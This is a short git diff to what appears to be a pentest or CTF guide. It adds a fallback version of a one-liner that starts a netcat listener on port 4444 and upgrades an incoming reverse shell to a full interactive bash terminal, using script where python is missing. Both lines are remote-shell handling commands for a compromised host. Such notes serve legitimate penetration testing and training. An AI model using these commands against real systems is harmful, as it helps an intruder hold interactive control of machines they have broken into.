@@ -20,6 +20,11 @@ Place the following snippet into your terminal to start an interactive session w
 ```bash
 stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines); export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"; cat) | nc -lvnp 4444; stty sane
 ```
+#If you don't have python, use this version:
+
+```bash
+stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines); export TERM=xterm-256color; /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp 4444; stty sane
+```
 
 This snippet should be executed from a terminal that supports raw mode and PTY allocation.
 
